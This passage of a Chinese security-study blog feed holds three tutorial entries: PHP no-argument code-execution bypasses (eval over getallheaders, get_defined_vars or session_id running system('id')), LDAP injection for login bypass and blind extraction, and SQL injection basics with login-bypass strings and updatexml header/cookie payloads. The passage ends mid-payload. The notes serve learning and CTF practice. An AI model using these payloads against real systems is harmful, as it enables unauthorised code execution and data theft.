current()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也                        就是会返回$_GET变量的数组值</span><br><span class="line">          payload:</span><br><span class="line">          1） code=eval(end(current(get_defined_vars())));</span><br><span class="line">              &amp;flag=system(&#x27;ls&#x27;);    利用全局变量进RCE</span><br><span class="line">          2）flag=system(&#x27;id&#x27;);&amp;code=eval(pos(pos(get_defined_vars())));</span><br><span class="line">           </span><br><span class="line">           pos() 函数返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line">           该函数是 current() 函数的别名。</span><br><span class="line">                  </span><br><span class="line">                  </span><br><span class="line">                 </span><br><span class="line">session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回                      FALSE,返回参数给session_id()</span><br><span class="line">session_id()：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符               串（””）</span><br><span class="line">scandir()  文件读取</span><br></pre></td></tr></table></figure><h4 id="法1-4"><a href="#法1-4" class="headerlink" title="法1"></a>法1</h4><p><strong>getallheaders()</strong></p><p>这个函数的作用是获取http所有的头部信息，也就是headers，然后我们可以用var_dump把它打印出来，但这个有个限制条件就是必须在apache的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161d16d995.png" alt="image-20240401220518864"></p><p>可以看到，所有的头部信息都已经作为了一个数组打印了出来。但我们在实际的利用过程中并用不了这么多的，我们需要有选择的执行一些命令，这里就需要用到php中操纵数组的函数了，这里常见的是利用end()函数取出最后一位，并且只会取值，不会取键，所以键名随便取：</p><p><img src="https://bu.dusays.com/2024/05/13/664161d11991a.png" alt="image-20240401220554490"></p><p>结合上面一些其他相关函数</p><p>即可实现命令执行</p><p><img src="https://bu.dusays.com/2024/05/13/664161d22e250.png" alt="image-20240401221109115"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(array_rand(array_flip(getallheaders())));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(end(getallheaders()))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(pos(array_reverse(getallheaders())))</span><br></pre></td></tr></table></figure><p>都要传header</p><p><img src="https://bu.dusays.com/2024/05/13/664161cdd0404.png" alt="image-20240401221541707"></p><h4 id="法2-4"><a href="#法2-4" class="headerlink" title="法2"></a>法2</h4><p>get_defined_vars()</p><p><code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的</p><p><img src="https://bu.dusays.com/2024/05/13/664161d1c5281.png" alt="image-20240401221848316"></p><p>可以看到，它并不是获取的headers，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用GET方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<strong>current()<strong>函数，这个函数的作用是</strong>返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数</strong>，我们可以看看实际效果:</p><p><img src="https://bu.dusays.com/2024/05/13/664161d0a282c.png" alt="image-20240401222003408"></p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用**<code>end()</code>函数以字符串的形式取出最后的值**，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://bu.dusays.com/2024/05/13/664161d273720.png" alt="image-20240401222138752"></p><p><img src="https://bu.dusays.com/2024/05/13/664161d097103.png" alt="image-20240401222154762"></p><p>那我们把var_dump改成eval即可执行我们的phpinfo代码</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf49001.png" alt="image-20240401222220294"></p><p>那同样也能执行whoami命令</p><p><img src="https://bu.dusays.com/2024/05/13/664161d1350fe.png" alt="image-20240401222319324"></p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(end(current(get_defined_vars())));</span><br><span class="line">&amp;flag=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag=system(&#x27;id&#x27;);</span><br><span class="line">eval(pos(pos(get_defined_vars())))</span><br></pre></td></tr></table></figure><h4 id="法3-2"><a href="#法3-2" class="headerlink" title="法3"></a>法3</h4><p>session_id()</p><p>简单来说就是<strong>把恶意代码写到COOKIE的PHPSESSID</strong>中，然后利用session_id()这个函数去读取它，返回一个字符串，然后我们就可以用eval去直接执行了，这里有一点要注意的就是session_id()要开启session才能用，所以说要先session_start()，这里我们先试着把PHPSESSID的值取出来：<br><img src="https://bu.dusays.com/2024/05/13/664161d233292.png" alt="image-20240401222557307"></p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将<strong>恶意代码16进制编码</strong>以后再插入进去，而在php中，<strong>将16进制转换为字符串的函数为<code>hex2bin</code></strong></p><p><img src="https://bu.dusays.com/2024/05/13/664161cda411d.png" alt="image-20240401222635617"></p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，同时我们还要加上hex2bin函数</p><p><img src="https://bu.dusays.com/2024/05/13/664161d1a2a51.png" alt="image-20240401222701625"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_star())))</span><br><span class="line">cookie:PHPSESSIID=706870696e666f28293b     phpinfo();</span><br></pre></td></tr></table></figure><h4 id="法4-1"><a href="#法4-1" class="headerlink" title="法4"></a>法4</h4><p><strong>php函数直接读取文件</strong></p><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p><h5 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h5><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组</p><p>我们在代码中将<code>localeconv()</code>的返回结果输出出来，它返回的是一个二维数组，而它的第一位居然是一个点.</p><p>那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code></p><p><img src="https://bu.dusays.com/2024/05/13/664161cf1dd7e.png" alt="image-20240401223458115"></p><p>我们利用current函数把这个点取出来</p><p><img src="https://bu.dusays.com/2024/05/13/664161d177d59.png" alt="image-20240401223536322"></p><p>完成目录遍历操作</p><p><img src="https://bu.dusays.com/2024/05/13/664161cfb1d0f.png" alt="image-20240401223600546"></p><h5 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h5><p>scandir() 函数返回指定目录中的文件和目录的数组。</p><h5 id="current-pos"><a href="#current-pos" class="headerlink" title="current(pos)"></a>current(pos)</h5><p>pos()函数是current()函数的别名，两者是一样的</p><p>current() 函数返回数组中的当前元素（单元）。</p><p>每个数组中都有一个内部的指针指向它“当前的”元素，初始指向插入到数组中的第一个元素。</p><h5 id="dirname-和chdir"><a href="#dirname-和chdir" class="headerlink" title="dirname()和chdir()"></a>dirname()和chdir()</h5><p>chadir()这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为scandir()会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用chdir切就好了，如果要向上跳就要构造chdir(‘..’)</p><p>首先我们可以利用getcwd()获取当前目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">string(13) &quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure><p>那么怎么进行当前目录的目录遍历呢？<br>这里用scandir()即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure><p>那么既然不在这一层目录，如何进行目录上跳呢？<br>我们用dirname()即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure><p>那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir ( string $directory ) : bool</span><br></pre></td></tr></table></figure><p>将 PHP 的当前目录改为 directory。<br>所以我们这里在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirname(getcwd())</span><br></pre></td></tr></table></figure><p> 进行如下设置即可</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir(dirname(getcwd()))</span><br></pre></td></tr></table></figure><p>我们尝试读取&#x2F;var&#x2F;www&#x2F;123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>即可进行文件读取</p><h5 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h5><p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()</p><h5 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h5><p>取文件的打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAP注入</title>
      <link href="/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>几乎不考 考了再学  已学</p><h2 id="1-LDAP介绍"><a href="#1-LDAP介绍" class="headerlink" title="1.LDAP介绍"></a>1.LDAP介绍</h2><p> LDAP不定义客户端和服务端的工作方式，但会定义客户端和服务端的通信方式，另外，LDAP还会定义LDAP数据库的访问权限及服务端数据的格式和属性。LDAP有三种基本的通信机制：没有处理的匿名访问；基本的用户名、密码形式的认证；使用SASL、SSL的安全认证方式。LDAP和其他一些协议走的是同一个套路，基于tcp&#x2F;ip协议通信，注重服务的可用性、信息的保密性等等，除此之外还要回到那个最原始的问题：信任，当然信息安全的本质问题就是信任的问题。部署了LDAP的应用不会直接访问，目录中的内容，一般通过函数调用或者API，应用可以通过定义的C、Java的API进行访问，Java应用的访问方式为JNDI(Java Naming and Directory Interface)。</p><p>LDAP的URL形式为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldap://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，&lt;path&gt;:&lt;dn&gt;[?&lt;artribute&gt;[?&lt;scope&gt;?&lt;filter&gt;]]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如： ldap://austin.ibm.com/ou=Austin,o=IBM    ldap:///ou=Austin,o=IBM??sub?(cn=Joe Q. Public)</span><br></pre></td></tr></table></figure><p>看得出来在URL中这里使用逗号分隔查询，而数据库查询则使用’&amp;’号，这是LDAP特有的，另外这里o表示组织(organization)，u表示单元(unit)，cn表示country name，</p><p>LDAP注入攻击和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。</p><p>测试一个应用是否存在代码注入漏洞典型的方法是向服务器发送会生成一个无效输入的请求。因此，如果服务器返回一个错误消息，攻击者就能知道服务器执行了他的查询，他可以利用代码注入技术。回想一下之前讨论的，我们可以将注入环境分为两种：AND注入环境和OR注入环境。</p><h2 id="2-LDAP注入攻击"><a href="#2-LDAP注入攻击" class="headerlink" title="2.LDAP注入攻击"></a>2.LDAP注入攻击</h2><h3 id="AND-LDAP注入"><a href="#AND-LDAP注入" class="headerlink" title="AND LDAP注入"></a>AND LDAP注入</h3><p>这种情况，应用会构造由”&amp;”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(parameter1=value1)(parameter2=value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>绕过访问控制</p><p>一个登陆页有两个文本框用于输入用户名和密码，过滤器如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER=Uname)(PASSWORD=Pwd)) </span><br></pre></td></tr></table></figure><p>如果攻击者输入一个有效地用户名，如r00tgrok，然后再这个名字后面注入恰当的语句，password检查就会被绕过。输入Uname&#x3D;slisberger)(&amp;))，得到如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(USER= slisberger)(&amp;)(PASSWORD=Pwd))</span><br></pre></td></tr></table></figure><p>LDAP服务器只处理第一个过滤器，即仅查询(&amp;(USER&#x3D;slidberger)(&amp;))得到了处理。这个查询永真,故成功绕过</p><p>权限提升</p><p>现假设下面的查询会向用户列举出所有可见的低安全等级文档：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=document)(security_level=low)) </span><br></pre></td></tr></table></figure><p>这里第一个参数document是用户入口，low是第二个参数的值。如果攻击者想列举出所有可见的高安全等级的文档，他可以利用如下的注入：document)(security_level&#x3D;*))(&amp;(directory&#x3D;documents<br>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))(&amp;(direcroty=documents)(security_level=low))</span><br></pre></td></tr></table></figure><p>LDAP服务器仅会处理第一个过滤器而忽略第二个，因而只有下面的查询会被处理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(directory=documents)(security_level=*))</span><br></pre></td></tr></table></figure><p>结果就是，所有安全等级的可用文档都会列举给攻击者</p><h3 id="OR注入"><a href="#OR注入" class="headerlink" title="OR注入"></a>OR注入</h3><p>这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(|(parameter1=value1)(parameter2=value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>具体的注入方式和AND差不太多</p><h2 id="3-LDAP盲注"><a href="#3-LDAP盲注" class="headerlink" title="3.LDAP盲注"></a>3.LDAP盲注</h2><h3 id="AND盲注"><a href="#AND盲注" class="headerlink" title="AND盲注"></a>AND盲注</h3><p>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=printer)(type=Epson*))</span><br></pre></td></tr></table></figure><p>正确的过滤器为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=printer)(type=Epson*))</span><br></pre></td></tr></table></figure><p><code>而当注入*)(objectClass=*))(&amp;(objectClass=void时得到</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*))</span><br></pre></td></tr></table></figure><p>总是返回一个对象。当图标被显示时响应为真，否则为假。<br>这样我们就可以猜第二个括号的objectclass字段有些什么内容了。<br>LDAP盲注技术让攻击者使用基于TRUE&#x2F;FALSE的技术访问所有的信息。</p><h3 id="OR盲注"><a href="#OR盲注" class="headerlink" title="OR盲注"></a>OR盲注</h3><p>这种情况下，用于推测想要的信息的逻辑与AND是相反的，因为使用的是OR逻辑操作符。同样不予详述。</p><p>盲注深入</p><p>攻击者可以使用字母、数字搜索提取属性的值，这个想法的关键在于将一个复杂的值转化为TRUE&#x2F;FALSE列表。这个机制，通常称为booleanization，大意是二值化吧，图十二概括了该机制，可用于不同的方式。<br>假设攻击者想知道department属性的值，处理如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=a*))(object=printer))</span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=f*))(object=printer))</span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=fa*))(object=printer))</span><br></pre></td></tr></table></figure><p>如此根据返回的不同结果猜解是否正确，和MYSQL盲注类似。<br>同样，攻击者可以使用字符集削减技术减少获得信息所需的请求数，为完成这一点，他使用通配符测试给定的字符在值中是否为anywhere：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=*b*))(object=printer))</span><br><span class="line">(&amp;(idprinter=HPLaserJet2100)(department=*n*))(object=printer))</span><br></pre></td></tr></table></figure><p>这样子可以看department中是否有b和n，巧用可以加速猜解过程，当然一般肯定都是写脚本猜解</p><h2 id="4-防御LDAP注入"><a href="#4-防御LDAP注入" class="headerlink" title="4.防御LDAP注入"></a>4.防御LDAP注入</h2><p> 总而言之，我们看到圆括号、星号、逻辑操作符、关系运操作符在应用层都必须过滤。无论什么时候，只要可能，构造LDAP搜索过滤器的值在发送给LDAP服务器查询之前都要用应用层有效地值列表来核对。正则表达式替换掉就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2024/05/13/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/05/13/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>后端漏洞</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>SQL 是用于访问和处理数据库的标准的计算机语言</p><p>primary key: 主键   用于区分表格中的元素  使元素唯一确定   可以多个</p><p>foreign key :外键  用于对应另一表格的主键</p><p>创建资料库： CREATE DATABASE <code> 资料库 名字</code>(反引号);</p><p>列出所有资料库：SHOW DATABASES;</p><p>删除资料库：DROP DATABASE<code>资料库名字</code>;</p><p>选择资料库：USE<code>资料库名</code></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>INT       整数</p><p>DECIMAL(X,Y)   有小数点的小数  两个参数</p><p>VARCHAR(N)   字符串   n：最多存放的字符数</p><p>BLOB:   二进制资料（图片  影片  档案）</p><p>DATE:    日期   XX-YY-DD</p><p>TIMESTAMP :    记录时间  XXXX-CC-VV  FF:AA:KK</p><p>创建表格：CREATE TABLE <code>表格名</code>（</p><p>​                   <code>属性名</code>+类型+PK                  </p><p>​                   <code>属性名</code>+类型</p><p>​                    ……</p><p>​              ）；</p><p>展示表格： DESCRIBE<code>表格名</code></p><p>删除表格：DROP  TABLE<code>表格名</code></p><p>新增表格属性：ALTER TABLE<code>表格名</code>ADD  属性 类型</p><p>删除表格属性：ALTER TABLE<code>表格名</code>DROP  COLUMN 属性 </p><p>向表格中存资料：INSERT INTO 表格名 VALUES 属性</p><p>搜寻表格中的全部资料：SELECT*REOM 表格名</p><p>限制：在创建TABLE时在属性后可以加限制</p><p>​           NOT NULL   不可用为空</p><p>​           VNIQUE    不可重复</p><p>​          DEFAULT  预设值</p><p>​          AUTO-INCREMENT   自动加一</p><p>修改资料：UPDATE 表格名  </p><p>、              SET 属性名 &#x3D;改后名</p><p>​                 WHERE 属性名&#x3D;原来名</p><p>删除资料：DELETE FROM 表格名</p><p>​                    WHERE 属性&#x3D;XX AND 属性&#x3D;xx                   &lt;, &gt;, &lt;&gt;  ,等也可以</p><p>取得资料：SELECT 属性，属性FROM表格    （后面也可以加限制）</p><p>排序: ~ORDER BY(属性由高到低 从上到下)   </p><p>​                         ~   DESC(反过来)</p><p>去不重复的资料： SELECT DISTINCT ~</p><p>聚合函数：COUNT    表格中的某属性的总数</p><p>​                   AVG         算平均</p><p>​                   MAX         算最高</p><p>​                   MIN          算最低</p><p>​                   SUM        算总和</p><p>万用字符：%   多字符     -一个字符</p><p>UNION:将XX于XX连接在一起（多个搜寻结合）</p><p>JOIN：连结两个表格</p><p>子查询:     ~</p><p>​                WHERE XX(</p><p>SECECT……</p><p>)</p><p>ON DELETE:若删去一项，则另一项也将改变</p><p>​                         ON DELETE  SET NULL   变成NULL</p><p>​                         ON DELETE CASCADE     一起删去</p><p>单行注释：#      –</p><p>   多行注释：&#x2F;*</p><p>​                      </p><p>​                    *&#x2F;</p><p>内联注释：&#x2F;*！</p><p>​                           *&#x2F;</p><p>   保持与其他数据兼容 在不兼容的数据库中不执行，而在MySQL中执行</p><h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><p>原理：通过在向数据库的sql语言中进行一些更改，使原来的指令发生一些改变，进而获取一些本得不到的信息</p><p>查库名–&gt;查表名–&gt;查字段</p><h3 id="简单分类"><a href="#简单分类" class="headerlink" title="简单分类"></a>简单分类</h3><h4 id="1-按数据类型分类"><a href="#1-按数据类型分类" class="headerlink" title="1.按数据类型分类"></a>1.按数据类型分类</h4><p><code>①数字型注入点</code><br> 在 Web 端大概是 <a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where id=1。组合出来的sql注入语句为：select * from news where id=1 and 1=1</span><br></pre></td></tr></table></figure><p><code>②字符型注入点</code><br> 在 Web 端大概是 <a href="http://xxx.com/news.php?name=admin">http://xxx.com/news.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27;注意多了引号。组合出来的sql注入语句为：select * from news where chr=&#x27;admin&#x27; and 1=1 &#x27; &#x27;</span><br></pre></td></tr></table></figure><p><code>③搜索型注入点</code><br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from 表名 where 字段 like &#x27;%关键字%&#x27;。</span><br><span class="line"></span><br><span class="line">组合出来的sql注入语句为：</span><br><span class="line">select * from news where search like &#x27;%测试 %&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;</span><br><span class="line"></span><br><span class="line">测试%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure><h4 id="2-按照数据提交的方式来分类"><a href="#2-按照数据提交的方式来分类" class="headerlink" title="2.按照数据提交的方式来分类"></a>2.按照数据提交的方式来分类</h4><p><code>①GET 注入</code><br>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> , id 是注入点。</p><p><code>②POST 注入</code><br>使用 POST 方式提交数据，注入点位置在 POST 数据部分，post提交方式主要适用于表单的提交，用于登录框的注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的万能username语句：</span><br><span class="line"> a ’ or 1=1 #</span><br><span class="line"> a &quot;) or 1=1 #</span><br><span class="line"> a‘) or 1=1 #</span><br><span class="line"> a” or “1”=”1</span><br><span class="line"> &#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"> &#x27; or (length(database())) = 8  (用于输入’ “都没有错误)</span><br><span class="line"> &#x27; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)</span><br><span class="line"> &quot;) or (&quot;1&quot;)=(&quot;1</span><br><span class="line"> &quot;) or 1=1 or if(1=1, sleep(1), null)  #</span><br><span class="line"> &quot;) or (length(database())) = 8 #</span><br><span class="line"> &quot;) or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  #</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post型盲注通杀payload：</span><br><span class="line"></span><br><span class="line">uname=admin%df&#x27;or()or%200%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><code>③Cookie 注入</code><br>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。有报错信息可以利用报错注入</p><blockquote><p>第一步：寻找参数位置<br>eg：.asp?id&#x3D;xx这样带参数id&#x3D;xx</p><p>第二步：去掉参数，观察参数影响<br>eg：将“id&#x3D;xx”删掉，看页面是否正常，正常，则说明参数不起作用。反之不正常，说明参数在数据传递中启直接作用</p><p>第三步：（先清空网址）输入“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx”));”<br>按Enter键后弹出一个对话框，内容是“id&#x3D;xx”</p><p>然后重新输入原来URL回车</p><p>如果显示正常，说明是用Request(“id”)方式获取数据</p><p>&#x2F;&#x2F;注释</p><p><strong>document.cookie:表示当前浏览器中的cookie变量</strong></p><p><strong>alert（）:表示弹出一个对话框</strong></p><p><strong>escape():对字符串进行编码</strong></p><p>第四步：判断是否存在漏洞<br>将SQL判断语句带入，并重复第三步</p><p>①“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx and 1&#x3D;1”));”</p><p>②“javascript:alert(document.cookie&#x3D;“id&#x3D;”+escape(“xx and 1&#x3D;2”));”。</p><p>若①正常，②不正常，则说明存在注入漏洞，并可以进行cookie注入</p><p>第五步：cookie注入<br>构造cookie注入payload</p><p>javascript:alert(document.cookie&#x3D;”smallclass&#x3D;”+escape(“xx order by 2”));</p><p>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“284 union select 1,…… from xx”));</p></blockquote><p>还有结合exists</p><ul><li>括号中的子查询并不会返回具体的查询到的数据，只是会返回true或者false，如果外层sql的字段在子查询中存在则返回true，不存在则返回false</li><li>即使子查询的查询结果是null，只要是对应的字段是存在的，子查询中则返回true</li></ul><blockquote><p>document.cookie&#x3D;”id &#x3D; “ + escape(“105 and exists(select * from 表名)”)</p></blockquote><p>也可用报错注入</p><p><code>④HTTP 头部注入</code><br>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:.........&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure><p><code>User-Agent注入</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:1&#x27; and updatexml(1,concat(0xx5e,version(),0x5e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><code>Referer 注入</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x5e,version(),0x5e),1) and 